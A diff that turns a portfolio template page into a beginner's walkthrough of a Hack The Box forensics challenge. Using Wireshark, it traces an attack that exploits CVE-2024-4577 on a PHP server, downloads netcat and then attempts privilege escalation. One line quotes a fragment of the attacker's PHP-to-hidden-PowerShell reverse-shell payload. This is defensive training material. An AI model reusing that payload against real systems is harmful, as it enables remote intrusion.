@@ -1,81 +1,70 @@
 ---
 layout: page
-title: project 1
-description: with background image
-img: assets/img/12.jpg
+title: HTB Sherlock Packet Puzzle
+description: Blue Team CTF
+img: assets/img/packet.puzzle.11.JPG
 importance: 1
 category: work
 related_publications: true
 ---
 
-Every project has a beautiful feature showcase page.
-It's easy to include images in a flexible 3-column grid format.
-Make your photos 1/3, 2/3, or full width.
+Hello everyone and welcome to my first HTB Sherlock walkthrough, Today I will be going through Packet Puzzle. This Sherlock has us exploring through a PCAP file to analyse if an environment was compromised and go through the attackers actions.
 
-To give your project a background in the portfolio page, just add the img tag to the front matter like so:
+**What is the source IP address of the attacker involved in this Attack?**
+For the following Sherlock I am using Wireshark to analyse the PCAP file. I have started by putting in a filter for HTTP.REQUESTS, through this I discovered a GET request for a file nc64.exe which I thought was suspicious. I then did a quick google search to determine that this was a Netcat tool. From this I concluded that the IP 192.168.170.128 was the malicious actor.
+![Screenshot1](./img/packet_puzzle.1.png)
 
-    ---
-    layout: page
-    title: project
-    description: a project with a background image
-    img: /assets/img/12.jpg
-    ---
 
-<div class="row">
-    <div class="col-sm mt-3 mt-md-0">
-        {% include figure.liquid loading="eager" path="assets/img/1.jpg" title="example image" class="img-fluid rounded z-depth-1" %}
-    </div>
-    <div class="col-sm mt-3 mt-md-0">
-        {% include figure.liquid loading="eager" path="assets/img/3.jpg" title="example image" class="img-fluid rounded z-depth-1" %}
-    </div>
-    <div class="col-sm mt-3 mt-md-0">
-        {% include figure.liquid loading="eager" path="assets/img/5.jpg" title="example image" class="img-fluid rounded z-depth-1" %}
-    </div>
-</div>
-<div class="caption">
-    Caption photos easily. On the left, a road goes through a tunnel. Middle, leaves artistically fall in a hipster photoshoot. Right, in another hipster photoshoot, a lumberjack grasps a handful of pine needles.
-</div>
-<div class="row">
-    <div class="col-sm mt-3 mt-md-0">
-        {% include figure.liquid loading="eager" path="assets/img/5.jpg" title="example image" class="img-fluid rounded z-depth-1" %}
-    </div>
-</div>
-<div class="caption">
-    This image can also have a caption. It's like magic.
-</div>
+**How many open ports did the attacker discover on the victim's system?**
+As I have determined that the malicious IP Address is 192.168.170.128 I completed a search using the attackers IP address and the defenders IP address. I discovered 8 RST Flags which would have confirmed to the attacker that the ports were open.
+![Screenshot1](./img/packet_puzzle.2.png)
 
-You can also put regular text between your rows of images, even citations {% cite einstein1950meaning %}.
-Say you wanted to write a bit about your project before you posted the rest of the images.
-You describe how you toiled, sweated, _bled_ for your project, and then... you reveal its glory in the next row of images.
+**What is the first open port that responded on the victim's system during reconnaissance?**
+By looking at the timestamps we can confirm that the first port that responded was port 22.
+![Screenshot1](./img/packet_puzzle.3.png)
 
-<div class="row justify-content-sm-center">
-    <div class="col-sm-8 mt-3 mt-md-0">
-        {% include figure.liquid path="assets/img/6.jpg" title="example image" class="img-fluid rounded z-depth-1" %}
-    </div>
-    <div class="col-sm-4 mt-3 mt-md-0">
-        {% include figure.liquid path="assets/img/11.jpg" title="example image" class="img-fluid rounded z-depth-1" %}
-    </div>
-</div>
-<div class="caption">
-    You can also have artistically styled 2/3 + 1/3 images, like these.
-</div>
 
-The code is simple.
-Just wrap your images with `<div class="col-sm">` and place them inside `<div class="row">` (read more about the <a href="https://getbootstrap.com/docs/4.4/layout/grid/">Bootstrap Grid</a> system).
-To make images responsive, add `img-fluid` class to each; for rounded corners and shadows use `rounded` and `z-depth-1` classes.
-Here's the code for the last row of images above:
+**What is the CVE identifier for the vulnerability exploited by the attacker?**
+CVE-2024-4577 was a vulnerability that interprets characters as PHP options, as seen in the wireshark logs.
+![Screenshot1](./img/packet_puzzle.4.png)
 
-{% raw %}
+**What is the name and version of the vulnerable product exploited to get RCE?**
+As the CVE identified is related to a PHP vulnerability we can determine that the product is a PHP server. Through following the TCP stream on a post request we can determine what specific version of PHP was running.
+![Screenshot1](./img/packet_puzzle.5.png)
 
-```html
-<div class="row justify-content-sm-center">
-  <div class="col-sm-8 mt-3 mt-md-0">
-    {% include figure.liquid path="assets/img/6.jpg" title="example image" class="img-fluid rounded z-depth-1" %}
-  </div>
-  <div class="col-sm-4 mt-3 mt-md-0">
-    {% include figure.liquid path="assets/img/11.jpg" title="example image" class="img-fluid rounded z-depth-1" %}
-  </div>
-</div>
+
+**What is the username of the victim account?**
+By using Follow TCP stream we can see that the attackers command was successful and shows its execution.
+![Screenshot1](./img/packet_puzzle.6.png)
+
+
+**At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?**
+As we go further down the Wireshark logs we can see that a POST request was sent including the following command <?php system('powershell -NoP -NonI Hidden -Exec Bypass -Command "$client which would have given the attacker a foothold on the system. We then look at the frame data and the UTC Arrival time.
+![Screenshot1](./img/packet_puzzle.7.png)
+
+**What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold?**
+T1190  would be the attack ID for an attacker getting initial access. T1190 relates to exploiting a public facing application E.G PHP website.
+
+**What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?**
+Through isolating traffic to port 80 and using TCP as the commands would not be through HTTP but through powershell and after much trial and error I was able to identify the correct stream and can see that EXE downloaded for privilege escalation. 
+![Screenshot1](./img/packet_puzzle.8.png)
+
+
+**What is the command line used by the attacker while performing privilege escalation?**
+Through further investigation I uncovered the command used by the adversary to attempt to perform privilege escalation. I believe that the downloaded file was TimeProvider.exe as this exploits windows time service for the program to be run.
+![Screenshot1](./img/packet_puzzle.9.png)
+
+
+**The attacker failed to escalate privileges and was given an error. What is the error?**
+We can see that attack failed as the error message 'Cannot create process Win32Error:2' was identified. 
+![Screenshot1](./img/packet_puzzle.10.png)
+
+**Summary**
+This Sherlock was a lot of fun and has given me insight on how much I need to improve my wireshark skills. I believe I need a refresher on HTTP codes as well as networking before I give another one a go. Thank you for reading
+
+
+
+
 ```
 
 {% endraw %}
